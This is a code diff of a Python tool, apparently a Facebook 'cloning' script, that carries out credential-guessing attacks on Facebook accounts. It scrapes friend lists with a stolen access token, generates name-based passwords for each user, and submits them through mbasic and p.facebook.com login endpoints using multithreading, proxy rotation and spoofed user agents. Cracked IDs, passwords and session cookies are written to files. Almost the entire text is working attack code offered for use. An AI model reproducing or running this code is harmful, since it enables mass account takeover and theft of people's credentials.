-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":fid,
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
-            'method':'GET',
-            'scheme':'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'dpr': '1',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
-            'sec-ch-ua-full-version-list': '"Google Chrome";v="117.0.5938.132", "Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.132"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro,
-            'viewport-width': '469',}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = user_id(coki)
-                try:
-                    uid=lo['uid']
-                except:
-                    uid=cid
-                    ckkx=lock_check(uid)
-                if ckkx=='LOCK':
-                    return
-                else:
-                 print('\r\r\033[1;32m[DRAGON-OK🌟]\033[1;33m ' +cid+ ' • ' +ps+ ' [🌺] • \033[1;97mJOIN DATE = \033[1;35m'+joined(cid)+ ' \n\033[1;33m[🍪]\033[1;34mCOOKIES = \033[1;32m'+coki+ '')
-                 print(50*'\033[36;5;14m─\033[1;37m')
-                 open('/sdcard/DRAGON-OK.txt', 'a').write( cid+' | '+ps+' \n')
-                 oks.append(fid)
-                 break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                #print('\r\r\033[1;30m[DRAGON-CP]  ' +uid+ ' • ' +ps+ ' \033[0;97m')
-                open('/sdcard/DRAGON-CP.txt', 'a').write( fid+' | '+ps+' \n')
-                cps.append(fid)
-                break
-            else:
-                continue
-        loop+=1
-    except requests.exceptions.ConnectionError:
-        time.sleep(10)
-lord_menu()
+def banner():
+	os.system("clear")
+	print (f"""
+\033[0;92m  
+   ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
+   ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
+   ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
+                                            \033
+===============================================
+  Auther        :  RJ SHANTO
+  Facebook      :  SH AN TO 
+  TOOLS         :  PRIVATE
+  Version       :  V-2
+  WhatsApp      :  013108682**
+=============================================== \033[1;31m""")
+def login():
+	banner()
+	SHANTOj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
+	SHANTOj('\033[0;97m===============================================')
+	SHANTO= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
+	if SHANTO in ['m']:
+		public()
+	elif SHANTO in ['1']:
+		crack_file()
+	elif SHANTO in ['i','0i']:
+		result()
+	elif SHANTO in ['2','02']:
+		os.system('xdg-open https://wa.me/+8801302199806')
+	elif SHANTO in ['0']:
+		os.system('rm -rf .token.txt')
+		os.system('rm -rf .cookie.txt')
+		print('#DONE LOGOUT ')
+		exit()
+	else:
+		print('# SELECT CORRECTLY ')
+		back()
+def error():
+	print(f'{k}#TRY AGAIN {u}')
+	time.sleep(4)
+	back()
+	
+def result():
+	os.system('clear')
+	banner()
+	print(' 1. CP ACCOUNT ')
+	print(' 2. OK ACCOUNT')
+	print(' 0. EXIT	')
+	kz = input('\n Choose : ')
+	if kz in ['1','01']:
+		try:vin = os.listdir('CP')
+		except FileNotFoundError:
+			print(' File Not Found')
+			time.sleep(3)
+			back()
+		if len(vin)==0:
+			print('You Have No CP Results ')
+			time.sleep(2)
+			back()
+		else:
+			cih = 0
+			lol = {}
+			for isi in vin:
+				try:hem = open('CP/'+isi,'r').readlines()
+				except:continue
+				cih+=1
+				if cih<10:
+					nom = '0'+str(cih)
+					lol.update({str(cih):str(isi)})
+					lol.update({nom:str(isi)})
+					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
+				else:
+					lol.update({str(cih):str(isi)})
+					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
+			geeh = input('\n   Choose : ')
+			try:geh = lol[geeh]
+			except KeyError:
+				print(' CHOOSE RIGHT OPTION ')
+				exit()
+			try:lin = open('CP/'+geh,'r').read().splitlines()
+			except:
+				print('FILE NOT FOUND ')
+				time.sleep(2)
+				back()
+			nocp=0
+			for cpku in range(len(lin)):
+				cpkuni=lin[nocp].split('|')
+				cpkuh=f'  {cpkuni[0]}  {cpkuni[1]}'
+				sol().print(cpkuh,style="yellow")
+				nocp +=1
+			input('[ Click Enter ]')
+			back()
+	elif kz in ['2','02']:
+		try:vin = os.listdir('OK')
+		except FileNotFoundError:
+			print('File Not Found ')
+			time.sleep(2)
+			back()
+		if len(vin)==0:
+			print(' No OK FILE HERE ')
+			time.sleep(2)
+			back()
+		else:
+			cih = 0
+			lol = {}
+			for isi in vin:
+				try:hem = open('OK/'+isi,'r').readlines()
+				except:continue
+				cih+=1
+				if cih<100:
+					nom = ''+str(cih)
+					lol.update({str(cih):str(isi)})
+					lol.update({nom:str(isi)})
+					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
+				else:
+					lol.update({str(cih):str(isi)})
+					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
+			geeh = input('\n CHOOSE : ')
+			try:geh = lol[geeh]
+			except KeyError:
+				print(' SELECT RIGHT OPTION ')
+				exit()
+			try:lin = open('OK/'+geh,'r').read().splitlines()
+			except:
+				print('File Not Found ')
+				time.sleep(2)
+				back()
+			nocp=0
+			for cpku in range(len(lin)):
+				cpkuni=lin[nocp].split('|')
+				cpkuh=f' {cpkuni[0]}  {cpkuni[1]}'
+				sol().print(cpkuh,style="green")
+				nocp +=1
+			input('[ CLICK ENTER 2 BACK ]')
+			back()
+	elif kz in ['0','00']:
+		back()
+	else:
+		print('SELECT RIGHT OPTION ')
+		exit()
+ 
+def public():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+		exit()
+	try:
+		os.system('clear')
+		banner()
+		jum = int(input('\x1b[1;97m [+] ENTER THE NUMBERS OF IDZ: '))
+	except ValueError:
+		
+		back()
+	if jum<1 or jum>100000000:
+		
+		back()
+	ses=requests.Session()
+	yz = 0
+	for met in range(jum):
+		yz+=1
+		kl = input(' [] INPUT ID '+str(yz)+': ')
+		uid.append(kl)
+	for userr in uid:
+		try:
+			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
+			for mi in col['friends']['data']:
+				try:
+					iso = (mi['id']+'|'+mi['name'])
+					if iso in id:pass
+					else:id.append(iso)
+				except:continue
+		except (KeyError,IOError):
+			pass
+		except requests.exceptions.ConnectionError:
+			print('#TRY AGAIN ')
+			os.system('clear')
+	try:
+		print(f' [] TOTAL ID: {P}'+str(len(id)))
+		print('')
+		setting()
+	except requests.exceptions.ConnectionError:
+		print(f'{u}')
+		back()
+	except (KeyError,IOError):
+		print(f'IF ID IS PUBLIC THEN TRY AGAIN WITH NEW COOKIE OTHRWISE CHECK YOUR ID LINK ')
+		time.sleep(3)
+		back()
+		
+def crack_file():
+	os.system('clear')
+	banner()
+	os.system('espeak -a 300 " your file name"')
+	print('\033[1;32m [Put File Example:  /sdcard/SHANTO.txt  Etc...]')
+	o = input('\x1b[1;97m [+] INPut FILE NAME : ')
+	print('')
+	try:lin = open(o).read().splitlines()
+	except:
+		print('File Not Found')
+		time.sleep(2)
+		back()
+	for xid in lin:
+		id.append(xid)
+	setting()
+	
+def setting():
+	hu = '3'
+	if hu in ['1','01']:
+		for tua in sorted(id):
+			id2.append(tua)
+	elif hu in ['2','02']:
+		muda=[]
+		for bacot in sorted(id):
+			muda.append(bacot)
+		bcm=len(muda)
+		bcmi=(bcm-1)
+		for xmud in range(bcm):
+			id2.append(muda[bcmi])
+			bcmi -=1
+	elif hu in ['3','03']:
+		for bacot in id:
+			xx = random.randint(0,len(id2))
+			id2.insert(xx,bacot)
+	else:
+		for bacot in id:
+			xx = random.randint(0,len(id2))
+			id2.insert(xx,bacot)
+	print('\x1b[1;92m ACTIVE FILE\n\x1b[1;97m [1] METHOD RJ.. ')
+	os.system('espeak -a 300 " 1,  method,  RJ"')
+	hc = input(' CHOOSE: ')
+	if hc in ['1','01']:
+		method.append('mobile')
+	elif hc in ['9','09']:
+		method.append('mbasic')
+	else:
+		method.append('mobile')
+	passwrd()
+	exit()
+ 
+def passwrd():
+	os.system('clear')
+	banner()
+	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTOTAL IDz :\033[0;97m '+str(len(id)))
+	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;95mCloning Speed Super Fast")
+	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
+	SHANTOj(f'\033[0;97m===============================================')
+	with tred(max_workers=30) as pool:
+		for yuzong in id2:
+			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+			frs = nmf.split(' ')[0]
+			pwv = []
+			if len(nmf)<6:
+				if len(frs)<3:
+					pass
+				else:
+					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(nmf)
+					pwv.append('57273200')
+					pwv.append(frs+'@')
+					pwv.append(frs+'@123')
+					pwv.append(frs+'@@')
+					pwv.append(frs+'@@@')
+					pwv.append(frs+'@@@@')
+					pwv.append(frs+'@#')
+					pwv.append(frs+'1122')
+					pwv.append(frs+'12')
+					pwv.append(frs+'11')
+					pwv.append(frs+'111')
+			else:
+				if len(frs)<3:
+					pwv.append(nmf)
+				else:
+					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(nmf)
+					pwv.append('57273200')
+					pwv.append(frs+'@')
+					pwv.append(frs+'@123')
+					pwv.append(frs+'@@')
+					pwv.append(frs+'@@@')
+					pwv.append(frs+'@@@@')
+					pwv.append(frs+'@#')
+					pwv.append(frs+'1122')
+					pwv.append(frs+'12')
+					pwv.append(frs+'11')
+					pwv.append(frs+'111')
+					
+				pool.submit(crack,idf,pwv)
+	print('')
+	SHANTOj('==========================================')
+	SHANTOj('CLONING COMPLETE .......... ')
+	print(f'{h}[{h}ðŸŒº{h}]{h} Your Total OK idz : {h}%s '%(ok))
+	input('CLICK ENTER TO EXIT ')
+		
+def crack(idf,pwv):
+	global loop,ok,cp
+	bo = random.choice([m,k,h,b,u,x])
+	sys.stdout.write(f"\r{bo}[SHANTO] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}{P}[{h}Ok {P}{bo}{ok}{P}] "),
+	sys.stdout.flush()
+	ua = random.choice(ugen)
+	ua2 = random.choice(ugen2)
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			nip=random.choice(prox)
+			proxs= {'http': 'socks4://'+nip}
+			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate, sdch","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
+			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			koki+=' m_pixel_ratio=2.625; wd=412x756'
+			heade = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, sdch', 'accept-language': 'en-US,en;q=0.9'}
+			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			if "checkpoint" in po.cookies.get_dict().keys():
+				#SHANTO-King
+				print(f'\r\033[0;94m[{time.strftime("%H:%M")}SHANTO-Cp] {idf}  {pw}\n\033[0;93 COOKIES \033[0;92m{kuki} ')     
+				os.system('espeak -a 300 " C,  P"')
+			    ##open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
+				akun.append(idf+'|'+pw)
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				#SHANTO-King
+				print(f'\r\033[0;92m[SHANTO-OK] {idf}  {pw}\n\033[0;93mCOOKIES  \033[0;92m{kuki} ')
+				print('\033[0;94m===============================================')
+				os.system('espeak -a 300 " SHANTO,  Ok,  id"')
+				open('OK/'+okc,'a').write(idf+' â€¢ '+pw+'\n')
+				cek_apk(session,coki)
+				break
+				
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
+	#----------------------------------------------#
+if __name__=='__main__':
+	try:os.system('git pull')
+	except:pass
+	try:os.system('touch prox.txt')
+	except:pass
+	
+login()
